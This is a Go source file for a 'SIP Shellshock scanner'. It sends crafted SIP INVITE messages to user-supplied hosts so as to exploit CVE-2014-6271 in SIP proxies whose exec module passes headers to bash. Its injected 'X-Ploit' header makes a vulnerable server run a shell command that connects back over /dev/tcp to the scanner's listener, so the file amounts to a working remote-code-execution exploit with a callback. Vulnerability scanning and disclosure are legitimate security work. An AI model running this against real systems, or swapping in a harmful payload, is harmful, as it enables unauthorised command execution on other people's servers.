/*
	SIP Shellshock scanner

	Copyright (C) 2014, Lefteris Zafiris <zaf.000@gmail.com>

	This program is free software, distributed under the terms of
	the GNU General Public License Version 3. See the LICENSE file
	at the top of the source tree.

	The exec module in Kamailio, Opensips and propably every other SER fork
	passes the received SIP headers as environment variables to the invoking shell.
	This makes these SIP proxies vulnerable to CVE-2014-6271 (Bash Shellshock).
	If a proxy is using any of the exec funtions and has the 'setvars' parameter set to 1 (default)
	then by sending SIP messages containing a specially crafted header we can run arbitrary code on the
	proxy machine.

*/

package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

var (
	lhost = flag.String("lhost", "", "Listening address")
	lport = flag.String("lport", "10111", "Local listening port")
	rport = flag.String("rport", "5060", "Remote port")
)

func main() {
	var err error
	flag.Parse()
	if net.ParseIP(*lhost) == nil {
		*lhost, err = localIP()
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
	}
	go scanListener(*lhost, *lport)
	wg := new(sync.WaitGroup)
	for _, host := range flag.Args() {
		if net.ParseIP(host) != nil {
			wg.Add(1)
			go sipScanner(host, *rport, *lhost, *lport, wg)
		}
	}
	wg.Wait()
	time.Sleep(2 * time.Second)
	fmt.Println("Done scanning")
}

// Scan SIP proxy by sending a SIP INVITE
func sipScanner(raddress, rport, laddress, lport string, wg *sync.WaitGroup) {
	defer wg.Done()
	invite := buildInv(raddress, rport, laddress, lport)
	host := net.JoinHostPort(raddress, rport)
	conn, err := net.Dial("udp", host)
	defer conn.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("Scanning: %v\n", host)
	conn.Write([]byte(invite))
}

// Listen for connections from vulnerable hosts
func scanListener(address, port string) {
	myHost := net.JoinHostPort(address, port)
	listener, err := net.Listen("tcp", myHost)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer listener.Close()
	fmt.Printf("Listening at: %v\n", myHost)
	for {
		conn, err := listener.Accept()
		if err == nil {
			fmt.Printf("Vulnerable host found: %v\n", conn.RemoteAddr())
			conn.Close()
		}
	}
}

// Create SIP INVITE package with extra header
func buildInv(raddress, rport, laddress, lport string) string {
	return fmt.Sprint(
		"INVITE sip:0987654321@"+raddress+" SIP/2.0\r\n",
		"Via: SIP/2.0/UDP 192.168.1.12:5062;branch=z9hG4bK724588683\r\n",
		"From: \"SipShock Scanner\" <sip:0123456789@"+raddress+">;tag=784218059\r\n",
		"To: <sip:0987654321@"+raddress+">\r\n",
		"Call-ID: 1864146746@192.168.1.12\r\n",
		"CSeq: 1 INVITE\r\n",
		"Contact: <sip:0123456789@192.168.1.12:5062>\r\n",
		"Content-Type: application/sdp\r\n",
		"Allow: INVITE, INFO, PRACK, ACK, BYE, CANCEL, OPTIONS, NOTIFY, REGISTER, SUBSCRIBE, REFER, PUBLISH, UPDATE, MESSAGE\r\n",
		"Max-Forwards: 70\r\n",
		"User-Agent: Yealink SIP-T26P\r\n",
		// The interesting stuff
		"X-Ploit: () { :;};exec >/dev/tcp/"+laddress+"/"+lport+"\r\n",
		"Supported: replaces\r\n",
		"Expires: 360\r\n",
		"Allow-Events: talk,hold,conference,refer,check-sync\r\n",
		"Content-Length: 234\r\n\r\n",
		"v=0\r\n",
		"o=- 20800 20800 IN IP4 192.168.1.12\r\n",
		"s=SDP data\r\n",
		"c=IN IP4 192.168.1.12\r\n",
		"t=0 0\r\n",
		"m=audio 11796 RTP/AVP 18 101\r\n",
		"a=rtpmap:18 G729/8000\r\n",
		"a=fmtp:18 annexb=no\r\n",
		"a=fmtp:101 0-15\r\n",
		"a=rtpmap:101 telephone-event/8000\r\n",
		"a=ptime:20",
		"a=sendrecv\r\n\r\n",
	)
}

// Determine the local IP
func localIP() (string, error) {
	ips, _ := net.InterfaceAddrs()
	for _, ip := range ips {
		ipnet, ok := ip.(*net.IPNet)
		if ok {
			if !ipnet.IP.IsUnspecified() && !ipnet.IP.IsLoopback() {
				return ipnet.IP.String(), nil
			}
		}
	}
	return "", fmt.Errorf("cannot determine local IP address")
}
